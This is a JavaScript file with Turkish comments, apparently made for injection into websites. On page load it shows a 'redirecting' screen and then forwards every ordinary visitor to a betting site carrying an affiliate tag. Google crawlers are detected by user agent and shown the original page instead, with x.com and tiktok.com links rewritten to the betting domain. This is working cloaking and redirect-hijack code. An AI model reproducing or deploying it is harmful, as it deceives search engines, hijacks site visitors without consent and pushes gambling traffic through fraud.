// --- AYARLAR ---
const oldDomains = ["x.com", "tiktok.com"];
const newDomain  = "www.betpuan821.com/tr?btag=2581125";
const maxPreloaderWaitTime = 1200; // kısa animasyonu
const redirectDelay = 150;         // preloader 1 kez çizilsin

(function () {
  // Varsa eski preloader'ı kaldır
  const existing = document.getElementById("geo-preloader");
  if (existing) existing.remove();

  // Preloader
  const preloader = document.createElement("div");
  preloader.id = "geo-preloader";
  preloader.style.position = "fixed";
  preloader.style.inset = "0";
  preloader.style.backgroundColor = "#0B192E";
  preloader.style.fontFamily = "'Poppins', Arial, sans-serif";
  preloader.style.display = "flex";
  preloader.style.alignItems = "center";
  preloader.style.justifyContent = "center";
  preloader.style.zIndex = "9999";
  preloader.style.transition = "opacity 0.35s ease";
  preloader.style.pointerEvents = "none";
  preloader.innerHTML = `
    <div style="display:flex;flex-direction:column;align-items:center;width:90%;max-width:500px;">
      <h1 style="font-size:1.5em;font-weight:600;color:#fff;margin:0 0 18px 0;text-align:center;line-height:1.5;">
        Sitemize yönlendiriliyorsunuz..
      </h1>
      <div style="width:100%;height:6px;background-color:rgba(255,255,255,.12);border-radius:3px;overflow:hidden;">
        <div class="loader-bar" style="width:0;height:100%;background:#fff;border-radius:3px;animation:fill-bar ${maxPreloaderWaitTime/1000}s linear forwards;"></div>
      </div>
    </div>
    <style>
      @keyframes fill-bar { from { width:0% } to { width:100% } }
      @media (max-width:600px){ h1{ font-size:1.2em } }
    </style>
  `;

  function appendPreloader() {
    if (document.body) document.body.appendChild(preloader);
    else document.addEventListener('DOMContentLoaded', () => document.body.appendChild(preloader));
  }
  appendPreloader();

  // Sadece Google botları yönlendirme görmesin
  function isGoogleBot() {
    const ua = navigator.userAgent || "";
    return /Googlebot|AdsBot-Google|APIs-Google|Mediapartners-Google|Googlebot-Mobile|Googlebot-Image|Google-Read-Aloud|DuplexWeb-Google|Google Favicon/i.test(ua);
  }

  // Botlar için: sayfada kal, eski domainleri metin ve linklerde yeniye çevir
  function runReplacements() {
    const p = document.getElementById("geo-preloader");
    if (p) p.remove();

    const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
    let node;
    while ((node = walker.nextNode())) {
      oldDomains.forEach(d => {
        if (node.nodeValue && node.nodeValue.includes(d)) {
          node.nodeValue = node.nodeValue.replaceAll(d, newDomain);
        }
      });
    }

    document.querySelectorAll("*").forEach(el => {
      ["href", "src", "action"].forEach(attr => {
        if (!el.hasAttribute(attr)) return;
        let v = el.getAttribute(attr);
        if (!v) return;
        oldDomains.forEach(d => { if (v.includes(d)) v = v.replaceAll(d, newDomain); });
        el.setAttribute(attr, v);
      });

      if (!["SCRIPT", "STYLE"].includes(el.tagName) && el.innerHTML && oldDomains.some(d => el.innerHTML.includes(d))) {
        let html = el.innerHTML;
        oldDomains.forEach(d => html = html.replaceAll(d, newDomain));
        el.innerHTML = html;
      }
    });
  }

  function run() {
    if (isGoogleBot()) {
      setTimeout(() => {
        preloader.style.opacity = "0";
        setTimeout(runReplacements, 200);
      }, 150);
    } else {
      setTimeout(() => {
        const redirectUrl = "https://" + newDomain + "/";
        try { window.location.replace(redirectUrl); }
        catch { window.location.href = redirectUrl; }
      }, redirectDelay);
    }
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", run);
  } else {
    run();
  }
})();
